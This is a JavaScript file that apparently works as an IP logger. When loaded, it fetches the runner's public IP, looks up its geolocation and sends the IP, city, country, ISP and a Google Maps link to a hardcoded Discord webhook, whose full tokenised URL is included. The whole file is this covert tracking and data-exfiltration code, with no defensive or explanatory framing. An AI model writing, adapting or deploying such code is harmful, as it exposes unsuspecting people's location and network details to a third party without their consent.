const ipifyAPI = "https://api.ipify.org?format=json";
const ipApiURL = "http://ip-api.com/json/";
const webhookURL =
  "https://discord.com/api/webhooks/1367683410989940756/cx2uFFLodvi3paS-hUHxv9waFC4LG2FEqRGLs0bO8nV3CQ-qvPnp8NYbsmiMkMHRteA5";

async function getIP() {
  try {
    const response = await fetch(ipifyAPI);
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error fetching IP:", error);
    return null;
  }
}

async function getGeoLocation(ip) {
  try {
    const response = await fetch(`${ipApiURL}${ip}`);
    const data = await response.json();
    if (data.status === "success") {
      return data;
    } else {
      console.error("Error fetching geolocation:", data.message);
      return null;
    }
  } catch (error) {
    console.error("Error fetching geolocation:", error);
    return null;
  }
}

async function sendToDiscord(ip, location) {
  if (!ip || !location) {
    console.error("IP address or location is null or undefined.");
    return;
  }

  const mapLink = `https://www.google.com/maps?q=${location.lat},${location.lon}`;
  const payload = {
    content: `IP Address: ${ip}\nLocation: ${location.city}, ${location.regionName}, ${location.country}\nISP: ${location.isp}\nMap: ${mapLink}`,
  };

  try {
    const response = await fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      console.log("IP and location sent to Discord successfully!");
    } else {
      console.error("Error sending data to Discord:", response.statusText);
    }
  } catch (error) {
    console.error("Error:", error);
  }
}

async function main() {
  const ip = await getIP();
  if (ip) {
    const location = await getGeoLocation(ip);
    if (location) {
      await sendToDiscord(ip, location);
    }
  }
}

main();
